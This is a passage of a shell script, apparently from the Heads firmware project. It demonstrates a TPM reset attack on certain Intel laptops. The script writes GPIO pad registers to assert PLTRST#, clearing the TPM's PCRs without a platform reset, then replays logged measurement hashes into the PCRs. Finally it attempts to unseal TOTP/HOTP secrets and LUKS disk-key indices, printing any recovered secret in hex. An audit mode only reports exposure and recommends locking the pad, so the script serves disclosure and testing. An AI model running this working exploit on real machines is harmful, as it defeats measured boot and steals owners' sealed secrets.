	# kukrimate inteltool.c method:
	#   1. tpm2_shutdown -c       (clear TPM session before reset)
	#   2. Write 0x80000000 to DW0 (assert PLTRST# via GPIO)
	#   3. tpm2_startup -c        (reinit TPM after reset)
	#
	# The 0x80000000 write sets mode=GPIO+TX=0, which asserts PLTRST# when
	# the pad switches from native function (NF1) to GPIO output and drives
	# the pad low.
	#
	# When the pad is already in GPIO mode (kernel-owned via HOSTSW_OWN), the
	# script first forces NF1 mode to re-connect the PLTRST# signal, then uses
	# the kukrimate write to switch back to GPIO+TX=0 and assert.

	# --- 4z. Shutdown TPM before asserting PLTRST# (kukrimate: tpm2_shutdown -c) ---
	DEBUG "  step 4z: TPM shutdown before PLTRST# assertion"
	if command -v tpmr.sh >/dev/null 2>&1; then
		INFO "  Shutting down TPM before PLTRST# assertion (tpmr.sh shutdown)..."
		tpmr.sh shutdown || WARN "tpmr.sh shutdown failed; continuing"
	else
		DEBUG "  tpmr.sh not available; skipping TPM shutdown"
	fi

	# --- 4a. Save current configuration (DW0 and DW1) ---
	INFO "  4a. Saving current PLTRST# pad configuration..."
	_dw0=$(mem_read32 "$TARGET_ADDR" 2>/dev/null)
	_dw1=$(mem_read32 "$((TARGET_ADDR + 4))" 2>/dev/null)
	if [ -z "$_dw0" ]; then
		DIE "Failed to read pad configuration at $TARGET_ADDR_HEX"
	fi
	_dw0_val=$(( 16#$_dw0 ))
	_dw1_val=$(( 16#$_dw1 ))
	_cur_mode=$(( (_dw0_val >> 10) & 0x7 ))
	_cur_tx=$(( _dw0_val & 1 ))
	_cur_hostsw=$(( (_dw0_val >> 14) & 1 ))
	_cur_rstcfg=$(( (_dw0_val >> 30) & 3 ))
	_cur_txdis=$(( (_dw0_val >> 8) & 1 ))
	DEBUG "  Saved DW0=0x$_dw0 DW1=0x$_dw1"
	DEBUG "    DW0 decode: raw=0x$(printf '%08x' $_dw0_val) mode=$_cur_mode TX=$_cur_tx TX_DIS=$_cur_txdis HOSTSW=$_cur_hostsw RSTCFG=$_cur_rstcfg"
	STATUS_OK "Saved PLTRST# pad config: DW0=0x$_dw0, DW1=0x$_dw1"

	# --- 4a2. If pad is in GPIO mode and NF1 switch failed, try TX toggle ---
	# When mode bits [12:10] are hardware-locked (NF1 write fails), the pad
	# cannot be switched to native function. But the TX bit (bit 0) may still
	# be writable. Toggling TX high→low creates a falling edge on the pad
	# output that the TPM sees as a PLTRST# assertion (active-low signal).
	if [ "$_cur_mode" = "0" ]; then
		DEBUG "  pad in GPIO mode (HOSTSW_OWN=$_cur_hostsw); forcing NF1 first"
		# Coreboot PAD_CFG_NF(GPP_B13, NONE, DEEP, NF1):
		# PADRSTCFG=DEEP(01<<30), mode=NF1(1<<10), TX=deassert(1), HOSTSW_OWN=0
		_nf1_val=$(( 0x40000000 | (1 << 10) | 1 ))
		DEBUG "  writing NF1: 0x$(printf '%08x' $_nf1_val)"
		mem_write32 "$TARGET_ADDR" "$_nf1_val"
		_nf1_rb=$(mem_read32 "$TARGET_ADDR" 2>/dev/null)
		_nf1_rb_mode=$(( ((16#$_nf1_rb) >> 10) & 0x7 ))
		DEBUG "  NF1 readback: 0x$_nf1_rb mode=$_nf1_rb_mode"
		if [ "$_nf1_rb_mode" != "1" ]; then
			DEBUG "  NF1 mode switch FAILED (mode=$_nf1_rb_mode); mode bits hardware-locked"
			INFO "  NF1 mode locked — trying TX toggle instead"
		fi
	fi

	# --- 4b. Assert PLTRST# ---
	# Two approaches, tried in order:
	# 1. kukrimate: write 0x80000000 (mode=GPIO+TX=0). Works when pad
	#    starts in NF1 mode — the GPIO→NF1 switch creates falling edge.
	# 2. TX toggle: write 0x80000001 (TX=1) then 0x80000000 (TX=0).
	#    When mode bits are locked in GPIO, toggling TX creates a high→low
	#    edge on the pad output. PLTRST# is active-low, so any high→low
	#    transition on the physical pin asserts the TPM reset.
	if [ "$_cur_mode" = "0" ] && [ "$_nf1_rb_mode" != "1" ]; then
		# Mode locked in GPIO — use TX toggle
		DEBUG "  TX toggle: writing 0x80000001 (TX=high)..."
		mem_write32 "$TARGET_ADDR" "0x80000001"
		_tx1_rb=$(mem_read32 "$TARGET_ADDR")
		_tx1_tx=$(( 16#$_tx1_rb & 1 ))
		DEBUG "    TX=1 readback: 0x$_tx1_rb TX=$_tx1_tx"
		sleep 0.1   # brief settle — was the TX bit accepted?
		DEBUG "  TX toggle: writing 0x80000000 (TX=low)..."
		mem_write32 "$TARGET_ADDR" "0x80000000"
	else
		# Pad in NF1 mode or NF1 switch succeeded — kukrimate approach
		DEBUG "  kukrimate: writing 0x80000000 (GPIO+TX=0)..."
		mem_write32 "$TARGET_ADDR" "0x80000000"
	fi
	_readback=$(mem_read32 "$TARGET_ADDR")
	_rb_mode=$(( ((16#$_readback) >> 10) & 0x7 ))
	_rb_tx=$(( 16#$_readback & 1 ))
	DEBUG "  assert write readback: 0x$_readback mode=$_rb_mode TX=$_rb_tx"
	INFO "  4b. PLTRST# asserted ($([ "$_cur_mode" = "0" ] && [ "$_nf1_rb_mode" != "1" ] && echo 'TX toggle' || echo 'kukrimate'))"

	INFO "  4c. Writing 0x00000000 to DW1..."
	mem_write32 "$((TARGET_ADDR + 4))" "0x00000000"
	_readback2=$(mem_read32 "$((TARGET_ADDR + 4))")
	DEBUG "  DW1 readback: 0x$_readback2"

	# --- 4d. Wait ---
	INFO "  4d. Waiting 1 second with PLTRST# asserted..."
	sleep 1

	# --- 4e. Deassert PLTRST# ---
	# kukrimate: restoring original NF1 config reconnects PLTRST# to the
	# PCH signal (normally high/deasserted). On ADL-P where the original
	# config is GPIO+TX=0, restoring would keep the pin low and re-assert
	# PLTRST#. Write NF1+TX=1 to deassert before any TPM operations.
	if [ "$_cur_mode" = "0" ]; then
		DEBUG "  deasserting PLTRST# via NF1 (original mode was GPIO+TX=0)"
		mem_write32 "$TARGET_ADDR" "$_nf1_val"
	else
		INFO "  4e. Restoring original pad config (deasserts PLTRST#)..."
		mem_write32 "$TARGET_ADDR" "$_dw0_val"
		mem_write32 "$((TARGET_ADDR + 4))" "$_dw1_val"
	fi

	# --- 4e2. Wait for TPM to come out of reset ---
	# After PLTRST# deasserts, the TPM needs time for internal
	# initialization (oscillator stabilization, self-test). The
	# kernel TPM driver also needs time to re-detect the device
	# on the LPC/eSPI bus. Without this wait, tpm2 startup -c
	# and pcrs may hang because the TPM is not yet responsive.
	INFO "  4e. Waiting 1s for TPM to reinitialize after PLTRST# deassert..."
	sleep 1

	# --- 4f. TPM startup after PLTRST# assertion (kukrimate: tpm2_startup -c) ---
	# After a GPIO-triggered PLTRST# pulse (CPU did not reset), the kernel
	# driver does NOT issue tpm2_startup(CLEAR). The TPM requires this
	# command before accepting any other commands.
	# Uses raw tpm2: tpmr.sh has no startup wrapper (it relies on the
	# kernel driver to call TPM2_Startup during full platform boot, which
	# does not happen after a GPIO-only PLTRST# pulse).
	INFO "  4f. Starting TPM after PLTRST# assertion (tpm2 startup -c)..."
	if command -v tpm2 >/dev/null 2>&1; then
		# Capture stderr to debug.log — don't suppress, we need to see
		# the actual TPM error code (e.g. TPM_RC_INITIALIZE = 0x100
		# means no bus reset occurred)
		_startup_out=$(tpm2 startup -c 2>&1)
		if [ $? -eq 0 ]; then
			STATUS_OK "TPM startup complete (NVRAM preserved)"
		else
			DEBUG "tpm2 startup -c failed: $_startup_out"
		fi
	else
		DEBUG "tpm2 not available; TPM may need startup via kernel"
	fi

	# --- 4g. Recreate Heads TPM sessions ---
	# After tpm2 startup -c, the TPM is initialized but the encrypted
	# sessions (enc.ctx, dec.ctx) from the original boot are gone.
	# tpmr.sh startsession recreates them using persistent key 0x81000000.
	INFO "  4g. Recreating TPM encrypted sessions (tpmr.sh startsession)..."
	if command -v tpmr.sh >/dev/null 2>&1; then
		if tpmr.sh startsession 2>/dev/null; then
			STATUS_OK "TPM sessions recreated (NVRAM preserved)"
		else
			WARN "  Could not recreate TPM sessions. Unseal will fail."
		fi
	else
		DEBUG "tpmr.sh not available; cannot recreate sessions"
	fi

	# --- 4h. Verify TPM is responsive (sysfs, kukrimate method) ---
	# kukrimate verifies via /sys/class/tpm/tpm0/pcrs (world-readable,
	# only appears after kernel TPM driver completes reinitialization).
	# This avoids the /dev/tpm0 permission race that affects tpm2 tools.
	# If sysfs pcrs is NOT available, no bus reset was detected — the
	# GPIO assertion did not work (TX/mode bits locked, no edge created).
	DEBUG "  step 4h: verifying TPM via sysfs pcrs (kukrimate method)"
	DEBUG "    /dev/tpm0: $([ -e /dev/tpm0 ] && ls -l /dev/tpm0 || echo 'NOT FOUND')"
	if [ -r /sys/class/tpm/tpm0/pcrs ]; then
		_pcr0_line=$(grep '^PCR-00' /sys/class/tpm/tpm0/pcrs 2>/dev/null | tail -1)
		DEBUG "    sysfs PCR-00: $_pcr0_line"
		_pcr0_val=$(echo "$_pcr0_line" | awk -F': ' '{print $2}' | tr -d ' ')
		DEBUG "    PCR 0: $_pcr0_val"
		if [ -n "$_pcr0_val" ]; then
			STATUS_OK "TPM is responsive (PCR 0 readable via sysfs)"
		else
			WARN "Cannot read PCR 0 via sysfs — TPM not responsive."
		fi
	else
		DEBUG "    /sys/class/tpm/tpm0/pcrs NOT FOUND"
		WARN "GPIO assertion FAILED: no TPM bus reset detected."
		WARN "TX and mode bits are hardware-locked on this platform."
		WARN "No PLTRST# edge was generated — TPM state unchanged."
		GPIO_FAILED="y"
	fi

	# --- 4h. Restore original pad config (cleanup, safe after TPM startup) ---
	if [ "$_cur_mode" = "0" ]; then
		DEBUG "  restoring original GPIO config (cleanup after TPM startup)"
		mem_write32 "$TARGET_ADDR" "$_dw0_val"
		mem_write32 "$((TARGET_ADDR + 4))" "$_dw1_val"
	fi

	INFO "  TPM GPIO reset via $MECHANISM: COMPLETE"
}

# ---- Verify reset by reading PCRs -------------------------------------

verify_pcrs() {
	TRACE_FUNC
	section "5. PCR VERIFICATION"

	if [ "$EXECUTE_MODE" = "y" ]; then
		# Use single-PCR reads via tpm2 pcrread sha256:N.
		# tpm2 pcrread sha256 (all PCRs) hangs after GPIO assertion;
		# single-PCR reads work. pcrs() calls the all-PCR path.
		INFO "  Reading post-assertion PCR state (single-PCR reads)..."
		POST_RESET_PCRS=""
		for _pcr_idx in 0 1 2 3 4 5 6 7; do
			_pcr_line=$(tpm2 pcrread "sha256:$_pcr_idx" 2>/dev/null | \
				grep -E '^\s*[0-9]+\s*:' | tail -1)
			POST_RESET_PCRS="$POST_RESET_PCRS
$_pcr_line"
		done
		POST_RESET_PCRS="${POST_RESET_PCRS#
}"
		if [ -z "$POST_RESET_PCRS" ]; then
			WARN "  Could not read PCR values"
			return
		fi
		STATUS_OK "Post-assertion PCR state captured"

		# Check if PCR 2 changed (should be zero after PLTRST# pulse)
		_pcr2_val=$(echo "$POST_RESET_PCRS" | grep -E '^\s*2\s*:' | awk '{print $3}')
		DEBUG "  PCR 2 value: $_pcr2_val"
		if [ -z "$_pcr2_val" ] || [ "$_pcr2_val" = "0x0000000000000000000000000000000000000000000000000000000000000000" ]; then
			STATUS_OK "PCR 2 is zero -- TPM was cleared"
		else
			WARN "  PCR 2 is non-zero -- PLTRST# assertion may not have cleared TPM"
			DEBUG "  PCR 2 value: $_pcr2_val"
		fi

		# Show PCR state in debug log
		DEBUG "Post-assertion PCR state:"
		DEBUG "$POST_RESET_PCRS"
	else
		DEBUG "audit mode: skipping PCR verification"
	fi
}

# ---- Replay PCR measurements via tpmr.sh infrastructure ----------------
#
# PCR 2: cbmem -L parsed via tpmr.sh AWK_PROG (handles all 3 log formats).
# PCR 4,5,7: /tmp/measuring_trace.log parsed generically for all PCR extends.
#
# Uses tpm2 pcrextend directly because tpmr.sh extend (-ic/-if) always
# re-hashes its input before extending. We need to replay pre-computed
# hashes from the measurement log verbatim; re-hashing would produce
# different digests that don't match the sealing policy.

# Helper: detect hash algorithm from hash length
_hash_algo() {
	TRACE_FUNC
	_hash_len="${#1}"
	DEBUG "_hash_algo: input len=$_hash_len"
	case "$_hash_len" in
		40) echo "sha1" ;;
		64) echo "sha256" ;;
		*) WARN "Unknown hash length: $_hash_len"; return 1 ;;
	esac
}

replay_measurements() {
	TRACE_FUNC
	section "6. MEASUREMENT REPLAY"

	# Source tpmr.sh for AWK_PROG (parses all 3 cbmem -L formats)
	if [ -z "$AWK_PROG" ]; then
		# shellcheck source=/dev/null
		. /bin/tpmr.sh 2>/dev/null
	fi

	if [ "$EXECUTE_MODE" != "y" ]; then
		DEBUG "audit mode: skipping measurement replay"
		return
	fi

	# --- PCR 2: coreboot SRTM from cbmem -L ---
	INFO "  Replaying PCR 2 (coreboot SRTM) from cbmem -L..."
	_log=$(cbmem -L 2>/dev/null)
	if [ -z "$_log" ]; then
		WARN "  cbmem -L returned no output"
	else
		# Detect algorithm from TPM version (SHA-256 for TPM 2.0, SHA-1 for TPM 1.2)
		_tpm_alg="sha256"
		command -v tpm2 >/dev/null 2>&1 || _tpm_alg="sha1"
		_pcr2_hashes=$(echo "$_log" | awk -v alg="$_tpm_alg" -v pcr="2" -f <(echo "$AWK_PROG") 2>/dev/null)
		if [ -n "$_pcr2_hashes" ]; then
			_count=0
			while read -r _hash; do
				[ -z "$_hash" ] && continue
				_algo=$(_hash_algo "$_hash") || continue
				tpm2 pcrextend "2:$_algo=$_hash" 2>/dev/null
				_count=$(( _count + 1 ))
			done <<< "$_pcr2_hashes"
			STATUS_OK "PCR 2: replayed $_count extends from cbmem -L"
		else
			WARN "  No PCR 2 hashes extracted from cbmem -L"
		fi
	fi

	# --- PCR 4,5,7: Heads extends from measuring_trace.log ---
	INFO "  Replaying Heads extends from /tmp/measuring_trace.log..."
	if [ -r /tmp/measuring_trace.log ]; then
		# Parse all "Extended PCR[N] with hash <hex_hash>" lines
		# Format: INFO: TPM: Extended PCR[7] with hash 96ab5053e4630a040d55549ba73cff2178d401d763147776771f9774597b86a1
		_lines=$(grep "Extended PCR\[" /tmp/measuring_trace.log 2>/dev/null)
		if [ -n "$_lines" ]; then
			_total=0
			while read -r _line; do
				_pcr=$(echo "$_line" | grep -o 'PCR\[[0-9]*\]' | grep -o '[0-9]*')
				_hash=$(echo "$_line" | grep -o 'hash [0-9a-f]*' | cut -d' ' -f2)
				if [ -n "$_pcr" ] && [ -n "$_hash" ]; then
					_algo=$(_hash_algo "$_hash") || continue
					tpm2 pcrextend "${_pcr}:$_algo=$_hash" 2>/dev/null
					_total=$(( _total + 1 ))
					DEBUG "PCR $_pcr extend: $_hash ($_algo)"
				fi
			done <<< "$_lines"
			STATUS_OK "Heads extends: replayed $_total operations from measuring_trace.log"
		else
			WARN "  No Heads extends found in measuring_trace.log"
		fi
	else
		WARN "  /tmp/measuring_trace.log not available"
	fi

	# Show final PCR state (single-PCR reads, all-PCR pcrs hangs after GPIO)
	INFO "  Final PCR state after replay:"
	for _pcr_idx in 0 1 2 3 4 5 6 7; do
		tpm2 pcrread "sha256:$_pcr_idx" 2>/dev/null | \
			grep -E '^\s*[0-9]+\s*:' | tail -1
	done

}

# ---- Attempt secret extraction ----------------------------------------

attempt_secret_extraction() {
	TRACE_FUNC
	section "7. SECRET EXTRACTION ATTEMPT"

	if [ "$EXECUTE_MODE" != "y" ]; then
		DEBUG "audit mode: skipping secret extraction"
		return
	fi

	# --- 7a. TOTP unseal ---
	INFO "  7a. Attempting TOTP secret unseal..."
	DEBUG "Attempting unseal at NVRAM index 0x4d47 (TOTP/HOTP)"
	_totp_secret="/tmp/secret/totp.key.tmp"
	rm -f "$_totp_secret" 2>/dev/null

	if command -v tpmr.sh >/dev/null 2>&1; then
		DEBUG "Running: tpmr.sh unseal 4d47 0,1,2,3,4,7 312 $_totp_secret"
		if tpmr.sh unseal 4d47 0,1,2,3,4,7 312 "$_totp_secret" 2>/dev/null; then
			STATUS_OK "TOTP secret unsealed successfully!"
			INFO "  Secret saved to $_totp_secret"
			if [ -s "$_totp_secret" ]; then
				INFO "  Secret hex: $(xxd -p < "$_totp_secret" | tr -d '\n')"
			fi
		else
			INFO "TOTP unseal failed. Expected if PCRs don't match the"
			INFO "sealing policy, or if no TOTP secret was ever sealed."
		fi
	else
		WARN "tpmr.sh not available; cannot unseal."
	fi
	DEBUG ""

	# --- 7b. HOTP unseal ---
	INFO "  7b. Attempting HOTP secret unseal..."
	_hotp_secret="/tmp/secret/hotp.key.tmp"
	rm -f "$_hotp_secret" 2>/dev/null
	DEBUG "Attempting unseal at NVRAM index 0x4d47 for HOTP"

	if command -v tpmr.sh >/dev/null 2>&1; then
		if tpmr.sh unseal 4d47 0,1,2,3,4,7 312 "$_hotp_secret" 2>/dev/null; then
			STATUS_OK "HOTP secret unsealed successfully!"
			INFO "  Secret saved to $_hotp_secret"
		else
			INFO "HOTP unseal failed (same secret as TOTP, expected)."
		fi
	fi
	DEBUG ""

	# --- 7c. LUKS DUK ---
	INFO "  7c. Attempting LUKS DUK unseal..."
	# The LUKS DUK index varies. Try common ones.
	for _idx in 0x81000001 0x81000002; do
		DEBUG "Probing NVRAM index $_idx for DUK"
		if command -v tpm2 >/dev/null 2>&1; then
			if tpm2 nvread "$_idx" 2>/dev/null; then
				DEBUG "DUK read succeeded from $_idx"
				STATUS_OK "LUKS DUK read succeeded from $_idx!"
				INFO "  NVRAM index $_idx is readable without auth after reset."
			fi
		fi
	done
	DEBUG ""

	# Summary
	DEBUG ""
	if [ -s "$_totp_secret" ]; then
		DEBUG "TOTP secret extracted successfully"
		DEBUG ""
		INFO "======================================================================"
		INFO "  ATTACK DEMONSTRATED: TPM secrets were extracted after PLTRST# assertion!"
		INFO "======================================================================"
		DEBUG ""
		INFO "  By asserting PLTRST# via GPIO ($MECHANISM on $GLOBAL_PCH) and replaying the"
		INFO "  measurement log, the following secrets were recovered:"
		INFO "    - TOTP/HOTP secret: YES"
		DEBUG ""
		INFO "  This proves the PLTRST# GPIO assertion bypasses the TPM's measured"
		INFO "  boot attestation on this platform."
	else
		DEBUG "No secrets extracted"
		INFO "No secrets were extracted. This is expected if no secrets"
		INFO "were sealed, or if the replay did not match the sealing policy."
	fi
}

# ---- Main -------------------------------------------------------------

usage() {
	cat >&2 <<USAGE_END
Usage: $SCRIPT_NAME [OPTIONS]

Options:
  --audit, -a             Safe audit: detect platform, report vulnerability
                           (no GPIO manipulation)
  --execute, --exec, -x   Assert PLTRST# via GPIO and replay measurements
                           (without this flag: no action, use --help)
  --help, -h              Show this help

This script demonstrates the TPM GPIO assertion attack on affected Intel
platforms. It detects the PCH via PCI ISA bridge device ID, reads PLTRST#
register state, asserts PLTRST# via GPIO (preserving NVRAM), replays PCR
measurements, and attempts TOTP/HOTP secret extraction.

USAGE_END
	exit 1
}

main() {
	TRACE_FUNC
	EXECUTE_MODE="n"
	AUDIT_MODE="n"
	PLATFORM_UNKNOWN="n"
	NOT_VULNERABLE="n"
	MECHANISM=""
	PCR_BASE=""
	GLOBAL_PCH=""
	GPIO_FAILED="n"
	MEASUREMENT_FILE="/tmp/measurements"

	DEBUG "SCRIPT_VERSION=2026-07-21-v4 EXECUTE_MODE=$EXECUTE_MODE"
	DEBUG "main: argc=$# argv=$*"

	if [ $# -eq 0 ]; then
		usage
	fi

	# Parse arguments
	for _arg in "$@"; do
		DEBUG "main: parsing argument '$_arg'"
		case "$_arg" in
			--audit|-a)
				AUDIT_MODE="y"
				DEBUG "AUDIT_MODE=y" ;;
			--execute|--exec|-x)
				EXECUTE_MODE="y"
				DEBUG "EXECUTE_MODE=y" ;;
			--help|-h)
				usage ;;
			*)
				WARN "Unknown option: $_arg"
				usage ;;
		esac
	done

	# Fallback: check $1 directly if loop didn't run (sourced scripts lose $@)
	if [ "${1:-}" = "--execute" ] || [ "${1:-}" = "--exec" ] || [ "${1:-}" = "-x" ]; then
		EXECUTE_MODE="y"
		DEBUG "EXECUTE_MODE=y (via \$1 fallback)"
	fi
	DEBUG "main: AUDIT_MODE=$AUDIT_MODE EXECUTE_MODE=$EXECUTE_MODE"

	print_banner

	if [ "$EXECUTE_MODE" = "y" ]; then
		DEBUG "main: execute mode confirmed, showing warning with NOTE delay"
		DEBUG ""
		INFO "  *** EXECUTE MODE ***"
		WARN "This asserts PLTRST# via GPIO. PCRs cleared, NVRAM preserved. Sealed secrets become accessible once PCRs are re-extended."
		DEBUG ""
		NOTE "Press Ctrl+C within 3 seconds to abort..."
	fi

	detect_platform
	calculate_registers
	read_pad_config
	# Pre-assertion PCR snapshot (execute only)
	if [ "$EXECUTE_MODE" = "y" ]; then
		INFO "  Capturing pre-assertion PCR state..."
		PRE_RESET_PCRS=$(pcrs 2>/dev/null)
		DEBUG "Pre-assertion PCR snapshot captured"
	fi
	perform_tpm_reset
	if [ "$GPIO_FAILED" = "y" ]; then
		DEBUG "GPIO assertion failed; skipping PCR verify, replay, and secret extraction"
	else
		verify_pcrs
		replay_measurements
		attempt_secret_extraction
	fi

	# Summary
	section "SUMMARY"

	if [ "$PLATFORM_UNKNOWN" = "y" ]; then
		DEBUG "Summary: PLATFORM_UNKNOWN=y, exiting with 0"
		INFO "  Platform not recognized or not in the vulnerability database."
		DEBUG ""
		INFO "  Known affected platforms implemented in this script:"
		INFO "  - CNP-H (T480s, T490, X390): GPIO PAD_CFG (PLTRST_CPU_B)"
		INFO "  - SPT/KBP (T480, T470, X270): GPIO PAD_CFG (GPP_B13)"
		INFO "  - ADL/RPL (NV4x, NS50, MSI Z790): GPIO PAD_CFG (GPP_B13)"
		DEBUG ""
		INFO "  Known NOT affected:"
		INFO "  - Pre-Skylake (T440p, X230, xx30): dedicated PLTRST pin"
		INFO "  - Meteor Lake (v540tu, v560tu): functional GPIO lock"
		DEBUG ""
		exit 0
	fi

	if [ "$EXECUTE_MODE" = "y" ]; then
		DEBUG "Summary: attack executed, exiting with 3"
		INFO "  PLTRST# GPIO assertion attack was EXECUTED on this platform."
		DEBUG ""
		INFO "  Platform class: $GLOBAL_PCH"
		if [ "$MECHANISM" = "GPIO_PAD_CFG" ]; then
			INFO "  Attack method: GPIO PAD_CFG (PLTRST_CPU_B pad $PLTRST_PAD)"
		else
			INFO "  Attack method: GPIO PAD_CFG via PCR MMIO"
		fi
		DEBUG ""
		DEBUG "PCR comparison: PRE_RESET_PCRS (non-zero, coreboot measurements) vs POST_RESET_PCRS (should be zero after assertion, restored after replay)"
		[ -n "$PRE_RESET_PCRS" ] && DEBUG "Pre-assertion PCR 2 was non-zero (contains coreboot SRTM measurements)"
		INFO "  PLTRST# assertion complete. PCRs are cleared."
		INFO "  NVRAM sealed blobs preserved (accessible once PCRs are re-extended)."
		DEBUG ""
		exit 3
	else
		DEBUG "Summary: vulnerable platform in audit mode, exiting with 2"
		INFO "  Platform $GLOBAL_PCH (device $GLOBAL_DEV_ID) is VULNERABLE."
		INFO "  PLTRST# pad is accessible via GPIO community at port $(printf "0x%x" $COMMUNITY_PORT)"
		INFO "  and is not locked by firmware (PADCFGLOCK not set)."
		INFO "  An OS with /dev/mem access can reset the TPM without"
		INFO "  platform reset, clearing all PCRs."
		DEBUG ""
		INFO "  Action: ensure coreboot locks this pad via gpio_lock_pad()"
		INFO "  or PAD_CFG_NF_LOCK(). Without a lock, the TPM measured"
		INFO "  boot chain is bypassable from the OS."
		DEBUG ""
		INFO "  Run with --execute to demonstrate the actual attack."
		DEBUG ""
		exit 2
	fi
}

main "$@"
